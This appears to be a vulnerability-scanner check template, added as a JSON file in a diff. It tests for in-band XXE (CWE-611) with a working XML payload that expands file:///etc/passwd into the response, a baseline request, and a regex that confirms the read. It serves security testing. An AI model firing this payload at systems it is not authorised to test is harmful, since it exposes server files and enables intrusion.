@@ -1,0 +1,43 @@
+{
+  "name": "web/XXE in-band external entity file read",
+  "description": "[mid] Classic in-band XXE (CWE-611; PayloadsAllTheThings XXE + PortSwigger): DOCTYPE defines a SYSTEM entity for file:///etc/passwd and the response embeds the expanded file — two-way file read without any OOB listener. Keywords: xxe xml external entity doctype file read passwd parser. ctrl: same XML without the entity parses clean -> not falsified. base_url = XML-ingesting endpoint (copy skill for SOAP/SVG/docx wrappers).",
+  "cwe": "CWE-611",
+  "requests": {
+    "payload": {
+      "method": "POST",
+      "url": "{{base_url}}/api/parse",
+      "headers": {
+        "Content-Type": "application/xml"
+      },
+      "body": "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><root>&xxe;</root>"
+    },
+    "baseline": {
+      "method": "POST",
+      "url": "{{base_url}}/api/parse",
+      "headers": {
+        "Content-Type": "application/xml"
+      },
+      "body": "<?xml version=\"1.0\"?><root>ok</root>"
+    }
+  },
+  "conditions": [
+    {
+      "type": "body_regex",
+      "request": "payload",
+      "pattern": "root:[a-z*]{1,12}:0:0"
+    },
+    {
+      "type": "status",
+      "request": "baseline",
+      "equals": 200
+    }
+  ],
+  "params": [
+    "base_url"
+  ],
+  "source": "imported",
+  "successes": 1,
+  "id": "4fd0bb17c488",
+  "created": "2026-11-06T00:00:00+00:00",
+  "last_used": "2026-11-06T00:00:00+00:00"
+}
